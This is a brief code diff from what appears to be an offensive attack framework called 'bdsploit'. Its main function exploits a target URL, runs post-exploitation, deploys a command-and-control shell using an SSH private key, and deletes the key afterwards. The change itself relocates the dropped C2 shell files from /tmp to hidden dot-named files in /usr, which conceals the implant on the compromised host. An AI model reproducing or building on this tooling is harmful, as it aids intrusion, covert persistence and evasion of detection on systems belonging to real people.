@@ -25,7 +25,7 @@ def bdsploit(url):
     host = exploitation.exploit(url)
     print("***** To connect to the host use the following IP: {}{}{}".format(R, host, W))
     postexploitation.postexploit(host)
-    c2.c2(host, "tools/done.shell", "/home/test/.ssh/id_rsa", "/tmp/done.shell", "/tmp/test.sh")
+    c2.c2(host, "tools/done.shell", "/home/test/.ssh/id_rsa", "/usr/.bdsptc2.shell", "/usr/.bdsptc2.sh")
     delete.delete(host, "/home/test/.ssh/id_rsa")
 
 
